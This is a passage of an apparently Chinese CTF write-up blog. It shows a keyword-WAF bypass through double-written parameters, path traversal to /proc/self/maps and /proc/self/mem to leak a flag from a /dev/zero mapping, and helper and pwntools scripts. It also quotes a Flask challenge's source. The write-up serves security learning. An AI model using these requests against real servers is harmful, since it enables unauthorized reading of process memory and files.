class="keyword">match</span> = re.search(pattern, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">    length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">    </span><br><span class="line">    clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br></pre></td></tr></table></figure><p>这段代码处理了请求体，先把<code>offset length</code>匹配出来再将它们<strong>置空</strong>，<strong>置空</strong>是一个非常危险的操作，我们可以通过类似<strong>双写</strong>的方式，从而绕过关键字的<code>waf</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /.?offset=0&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/maps HTTP/1.1</span><br><span class="line">Host: 60.205.163.215:17309</span><br></pre></td></tr></table></figure><p>工作目录在<code>/app</code>，所以得目录穿越一下，<code>/../proc/self/maps</code></p><p>懒得本地搭环境，直接偷过来了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">56395827e000-56395827f000 r--p 00000000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">56395827f000-563958280000 r-xp 00001000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958280000-563958281000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958281000-563958282000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958282000-563958283000 rw-p 00003000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563959f5f000-56395a3b0000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fa2fe996000-7fa2fe998000 r--p 00000000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe998000-7fa2fe99b000 r-xp 00002000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99b000-7fa2fe99d000 r--p 00005000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99d000-7fa2fe99e000 r--p 00006000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99e000-7fa2fe99f000 rw-p 00007000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99f000-7fa2fe9a0000 r--p 00000000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a0000-7fa2fe9a2000 r-xp 00001000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a2000-7fa2fe9a4000 r--p 00003000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a4000-7fa2fe9a5000 r--p 00004000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a5000-7fa2fe9a6000 rw-p 00005000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a6000-7fa2fe9a8000 r--p 00000000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a8000-7fa2fe9af000 r-xp 00002000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9af000-7fa2fe9b1000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b1000-7fa2fe9b2000 r--p 0000a000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b2000-7fa2fe9b3000 rw-p 0000b000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b3000-7fa2fe9b8000 r--p 00000000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fe9b8000-7fa2fea67000 r-xp 00005000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea67000-7fa2fea7b000 r--p 000b4000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7b000-7fa2fea7c000 r--p 000c8000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7c000-7fa2fea7d000 rw-p 000c9000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7d000-7fa2fea80000 r--p 00000000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea80000-7fa2fea94000 r-xp 00003000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea94000-7fa2fea9b000 r--p 00017000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9b000-7fa2fea9c000 r--p 0001d000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9c000-7fa2fea9d000 rw-p 0001e000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9d000-7fa2feb94000 r--p 00000000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2feb94000-7fa2fef15000 r-xp 000f7000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2fef15000-7fa2ff04c000 r--p 00478000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff04c000-7fa2ff0cf000 r--p 005ae000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff0cf000-7fa2ff0d2000 rw-p 00631000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff0d2000-7fa2ff0d5000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff0d5000-7fa2ff0d9000 r--p 00000000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0d9000-7fa2ff0df000 r-xp 00004000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0df000-7fa2ff0e3000 r--p 0000a000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e3000-7fa2ff0e4000 r--p 0000d000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e4000-7fa2ff0e6000 rw-p 0000e000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e6000-7fa2ff0ea000 r--p 00000000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0ea000-7fa2ff0f1000 r-xp 00004000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f1000-7fa2ff0f5000 r--p 0000b000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f5000-7fa2ff0f6000 r--p 0000f000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f6000-7fa2ff0f7000 rw-p 00010000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f7000-7fa2ff1f7000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff1f7000-7fa2ff1f9000 r--p 00000000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1f9000-7fa2ff1fc000 r-xp 00002000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1fc000-7fa2ff1fe000 r--p 00005000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1fe000-7fa2ff1ff000 r--p 00006000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1ff000-7fa2ff200000 rw-p 00007000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff200000-7fa2ff300000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff300000-7fa2ff304000 r--p 00000000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff304000-7fa2ff30f000 r-xp 00004000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff30f000-7fa2ff318000 r--p 0000f000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff318000-7fa2ff319000 r--p 00017000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff319000-7fa2ff31a000 rw-p 00018000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff31a000-7fa2ff51a000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff51a000-7fa2ff52b000 r--p 00000000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff52b000-7fa2ff5a8000 r-xp 00011000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff5a8000-7fa2ff608000 r--p 0008e000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff608000-7fa2ff609000 r--p 000ed000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff609000-7fa2ff60a000 rw-p 000ee000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff60a000-7fa2ff632000 r--p 00000000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff632000-7fa2ff797000 r-xp 00028000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff797000-7fa2ff7ed000 r--p 0018d000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7ed000-7fa2ff7f1000 r--p 001e2000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7f1000-7fa2ff7f3000 rw-p 001e6000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7f3000-7fa2ff800000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff800000-7fa2ff900000 r--p 00000000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ff900000-7fa2ffb1f000 r-xp 00100000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffb1f000-7fa2ffc6f000 r--p 0031f000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffc6f000-7fa2ffce6000 r--p 0046e000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffce6000-7fa2ffe55000 rw-p 004e5000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffe55000-7fa2ffe56000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ffe5c000-7fa2ffe5f000 r--p 00000000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe5f000-7fa2ffe67000 r-xp 00003000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe67000-7fa2ffe6c000 r--p 0000b000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6c000-7fa2ffe6d000 r--p 0000f000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6d000-7fa2ffe6e000 rw-p 00010000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6e000-7fa2ffed4000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ffed4000-7fa2ffedb000 r--s 00000000 103:00 15520059                  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">7fa2ffedb000-7fa2fff35000 r--p 00000000 103:00 15519696                  /usr/lib/locale/C.utf8/LC_CTYPE</span><br><span class="line">7fa2fff35000-7fa2fff37000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2fff38000-7fa2fff39000 rw-s 00000000 00:01 6174                       /dev/zero (deleted)</span><br><span class="line">7fa2fff39000-7fa2fff3b000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2fff3b000-7fa2fff3c000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff3c000-7fa2fff64000 r-xp 00001000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff64000-7fa2fff6f000 r--p 00029000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff6f000-7fa2fff71000 r--p 00034000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff71000-7fa2fff72000 rw-p 00036000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff72000-7fa2fff73000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffe68e9d000-7ffe68ebe000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffe68ec9000-7ffe68ecd000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffe68ecd000-7ffe68ecf000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure><p><strong>/dev/zero</strong>是<code>Linux</code>的<code>零字节设备</code>，本身不存储任何数据，但通过<strong>mmap映射</strong>它时，会生成一块<strong>初始值为 0、支持读写</strong>的内存区域</p><p>由于<code>/dev/zero</code>映射区的特性（初始为 0、支持共享、无需关联真实文件数据），进程会通过<code>mmap(&quot;/dev/zero&quot;, ...)</code>创建这块内存，再将<code>flag</code>主动写入到这个映射区（覆盖初始的 0 值）</p><p><code>7fa2fff38000</code>转换为十进制数</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /.?offset=140338055577600&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/mem HTTP/1.1</span><br><span class="line">Host: 60.205.163.215:17309</span><br></pre></td></tr></table></figure><p>这里也偷一个计算偏移和长度的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">maps = <span class="built_in">open</span>(<span class="string">&quot;maps.txt&quot;</span>)</span><br><span class="line">b = maps.read()</span><br><span class="line"><span class="built_in">list</span> = b.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;rw&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        addr = re.search(<span class="string">&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;</span>, line)</span><br><span class="line">        <span class="comment"># 正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。</span></span><br><span class="line">        start = <span class="built_in">int</span>(addr.group(<span class="number">1</span>), <span class="number">16</span>)  <span class="comment"># 将十六进制字符转化为十进制数，为了符合start参数格式参考链接</span></span><br><span class="line">        end = <span class="built_in">int</span>(addr.group(<span class="number">2</span>), <span class="number">16</span>)  <span class="comment"># 将十六进制字符转化为十进制数，为了符合end参数格式</span></span><br><span class="line">        <span class="built_in">print</span>(start, end)</span><br><span class="line">        <span class="built_in">print</span>(end-start)</span><br></pre></td></tr></table></figure><p>好一个<strong>代码审计</strong>，这里只是<strong>非预期</strong>(?)，预期解应该是打<code>log</code>(?)</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期(?)"></a>预期(?)</h3><p>本题的接收代码函数只出现了两次，但<code>initial_data = conn.recv(256, socket.MSG_PEEK)</code>，此处多了参数<code>MSG_PEEK</code></p><blockquote><p>MSG_PEEK: 表示只是从缓冲区读取内容而不清除缓冲区，也就是说下次读取还是相同的内容，多进程需要读取相同数据的时候可以使用</p></blockquote><p>所以它的作用是，用来<strong>预处理</strong>，看接收的信息是否含有<strong>禁止的关键字</strong>以及是否<strong>开启log模式</strong></p><p>真正的读出并清除缓冲区是在<code>handle_connection</code>，此处还有一个接收<code>request_data = conn.recv(256)</code></p><blockquote><p>在读入前，如果开了log模式，会优先进行log再读入，我们可以传入一个较大的factor，然后在这段时间里发送不能被waf接受的数据，而路径中被污染的/?log=1&amp;factor=100000则在后续数据用../覆盖</p></blockquote><p>只发送一遍，会得到<code>500</code>的响应，而且修改<code>factor</code>的值会出现<strong>没有反应</strong>的问题</p><p>两个都发送的话，会直接返回<code>403</code><br>所以我也不知道本地是否可行了，但感觉<code>peek</code>确实是预期解，再蹲一下其他人或者出题人的<code>wp</code>？</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">remote1 = remote(host, port)</span><br><span class="line"></span><br><span class="line">remote1.send(<span class="string">b&#x27;GET /?log=1&amp;factor=100000&#x27;</span>)</span><br><span class="line">remote1.send(<span class="string">f&#x27;/../../../proc/self/maps&#x27;</span>.encode())</span><br><span class="line">resp = remote1.recv()</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><p>可惜的是，本地验证失败了<br>这里记录一下本地起<code>docker</code>的流程</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先把这个大包pull下来，直接构建大概率会失败</span></span><br><span class="line">docker pull python:3.12-slim</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建</span></span><br><span class="line">docker build -t peek .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 做端口映射</span></span><br><span class="line">docker run -d -p 1337:1337 --name web peek</span><br></pre></td></tr></table></figure><h2 id="Unfinished-待学习"><a href="#Unfinished-待学习" class="headerlink" title="Unfinished(待学习)"></a>Unfinished(待学习)</h2><blockquote><p>程序好像有点Bug，别急，明年就修复了（</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;your-secret-key-here&#x27;</span></span><br><span class="line"></span><br><span class="line">login_manager = LoginManager()</span><br><span class="line">login_manager.init_app(app)</span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">UserMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">id</span>, username, password, bio=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.bio = bio</span><br><span class="line">admin_password = os.urandom(<span class="number">12</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">USERS_DB = &#123;<span class="string">&#x27;admin&#x27;</span>: User(<span class="built_in">id</span>=<span class="number">1</span>, username=<span class="string">&#x27;admin&#x27;</span>, password=admin_password)&#125;</span><br><span class="line">USER_ID_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> USERS_DB.values():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(user.<span class="built_in">id</span>) == user_id:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">global</span> USER_ID_COUNTER</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS_DB:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        USER_ID_COUNTER += <span class="number">1</span></span><br><span class="line">        new_user = User(</span><br><span class="line">            <span class="built_in">id</span>=USER_ID_COUNTER,</span><br><span class="line">            username=username,</span><br><span class="line">            password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        USERS_DB[username] = new_user</span><br><span class="line">        login_user(new_user)</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, <span class="string">&#x27;your_ticket_value&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        user = USERS_DB.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;Invalid credentials.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ticket&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ticket</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        ticket = request.form[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, ticket)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;ticket.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block content %&#125;&#125;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 